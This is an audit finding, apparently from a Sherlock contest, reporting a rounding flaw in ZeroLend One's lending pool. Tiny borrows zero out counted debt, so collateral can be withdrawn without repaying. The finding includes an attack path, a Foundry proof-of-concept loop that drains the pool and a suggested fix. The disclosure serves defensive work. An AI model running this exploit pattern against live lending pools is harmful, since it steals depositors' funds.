Elegant Raspberry Lynx

High

# Small amount of borrow can drain pool

### Summary

A user can supply some amount of a token and borrow a small amount of a token from the pool and withdraw the initial amount they supplied without repaying the borrowed amount which could cause insolvency for the pool.

### Root Cause

https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ValidationLogic.sol#L124
The `validateBorrow` function In `ValidationLogic.sol` is used to validate borrow request from the user, currently it only requires that the borrowed amount is not 0, this allows user to borrow a minuscule amount of token.

https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ValidationLogic.sol#L239
The `validateHealthFactor` function in `ValidationLogic.sol` validate the requested amount of withdrawal from the user corresponding to the health factor.  The `healthFactor` variable returned from the `GenericLogic.calculateUserAccountData` function is compared with the `HEALTH_FACTOR_LIQUIDATION_THRESHOLD`  to be bigger or equal or else it reverts with an error. 

https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/GenericLogic.sol#L69
Inside the `calculateUserAccountData` function the `vars.totalDebtInBaseCurrency` variable determines the `healthFactor` variable. The `vars.totalDebtInBaseCurrency` variable is increased by the `_getUserDebtInBaseCurrency` function. 

https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/GenericLogic.sol#L184
Inside this function the `usersTotalDebt` variable is divided by the  `assetUnit` variable which is fetched from the reserve configuration of the asset. This is a problem if the `assetUnit` is bigger than the `usersTotalDebt` as it will amount to 0 in the end which would set the `healthFactor` variable to `type(uint256).max` which would allow the user to withdraw the initial amount that is supplied while still keeping the borrowed amount.

### Internal pre-conditions

1. Reserve Configuration of the asset needs to be borrowable :
- frozen: false
- borrowable: true

### External pre-conditions

1. At least 1 user needs to supply the token in the pool for an attacker to exploit this vulnerability.

### Attack Path

1. User 1 supply 1e18 wei of token A
2. Attacker supply 1e13 wei of token A at position index 0
3. Attacker borrow 1e9*9 wei of token A at position index 0
4. Attacker withdraw initial supplied amount of token A at position index 0
5. Attacker repeat step 2 - 4 for possibly thousands of times at incrementing position index (1,2,3....) 
6. User 1 withdraw initial supplied amount of token A (Revert error)

### Impact

- Pool insolvency
- Loss of funds for users
- Reputational damage for the protocol

### PoC

```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.19;

import {MintableERC20} from '../../../../contracts/mocks/MintableERC20.sol';
import {PoolEventsLib, PoolSetup} from '../../core/pool/PoolSetup.sol';
import {console2} from '../../../../lib/forge-std/src/console2.sol';
import {stdError} from '../../../../lib/forge-std/src/StdError.sol';
import {DataTypes} from '../../../../contracts/core/pool/configuration/DataTypes.sol';
import {ReserveConfiguration} from '../../../../contracts/core/pool/configuration/ReserveConfiguration.sol';

contract mytest is PoolSetup {
  function setUp() public {
    _setUpPool();

    console2.log('This:', address(this));
    console2.log('msg.sender:', address(msg.sender));
    console2.log('owner:', address(owner));
    console2.log('whale:', address(whale));
    console2.log('ant:', address(ant));
    console2.log('governance:', address(governance));
  }

  function testSmallBorroWithdraw() external {
    
    uint256 index = 0;
    pos = keccak256(abi.encodePacked(address(owner), 'index', uint256(index)));
    uint256 mintAmount = 5 ether;

    tokenA.mint(owner, mintAmount);
    tokenA.mint(whale, mintAmount);
    tokenA.mint(ant, mintAmount);

    vm.startPrank(owner);
    tokenA.approve(address(pool), mintAmount * 1e9);

    vm.startPrank(ant);
    tokenA.approve(address(pool), mintAmount * 1e9);

    vm.startPrank(whale);
    tokenA.approve(address(pool), mintAmount * 1e9);

    console2.log('Owner Balance: ', tokenA.balanceOf(owner));
    console2.log('Ant Balance: ', tokenA.balanceOf(ant));
    console2.log('Whale Balance: ', tokenA.balanceOf(whale));
    console2.log('Pool Balance: ', tokenA.balanceOf(address(pool)));

    vm.startPrank(whale);
    pool.supplySimple(address(tokenA), whale, mintAmount, index);
    // pool.borrowSimple(address(tokenA), whale, mintAmount/2, index);
    // pool.withdrawSimple(address(tokenA), whale, mintAmount, index);

    vm.startPrank(owner);

    //Why only 4000 ? Avoid out of gas error, there could be a way to bypass this in foundry but due to time constraint, this is the best POC for now...
    for(uint i = 0; i < 4000; i++){
      pool.supplySimple(address(tokenA), owner, mintAmount, index+i);
      pool.borrowSimple(address(tokenA), owner, 1e9*9, index+i);
      pool.withdrawSimple(address(tokenA), owner, mintAmount, index+i);

      // console2.log(i);

    }

    // pool.borrowSimple(address(tokenA), owner, 1e9, index);

    // vm.startPrank(ant);
    // pool.supplySimple(address(tokenA), ant, mintAmount, index);
    // pool.borrowSimple(address(tokenA), ant, 1e9*9, index);
    // // pool.repaySimple(address(tokenA), 1e9*9, index);
    // pool.withdrawSimple(address(tokenA), ant, mintAmount, index);

    console2.log('Owner Debt: ', pool.getDebt(address(tokenA), owner, 0));
    // console2.log('Ant Debt: ', pool.getDebt(address(tokenA), ant, 0));

    console2.log('Owner Balance: ', tokenA.balanceOf(owner));
    // console2.log('Ant Balance: ', tokenA.balanceOf(ant));
    console2.log('Whale Balance: ', tokenA.balanceOf(whale));
    console2.log('Pool Balance: ', tokenA.balanceOf(address(pool)));

    vm.startPrank(whale);
    pool.withdrawSimple(address(tokenA), owner, mintAmount, index); //[FAIL. Reason: panic: arithmetic underflow or overflow (0x11)]

  }
}

```

### Mitigation

Fix the require statement in  `validateBorrow` function In `ValidationLogic.sol` such that it the minimum borrowed amount depends on the decimals of the asset borrowed. An attacker can get away borrowing 1e9 of an asset with 1e18 decimal but fails when it tries to borrow 1e10, hence the require statement could be something like "minimum borrow amount needs to be 8 decimal difference to the asset decimal". Could be something like this:

```solidity
uint256 minAmount = 10 ** params.cache.reserveConfiguration.getDecimals() / 1e8;
require(params.amount >= minAmount, PoolErrorsLib.INVALID_AMOUNT);
```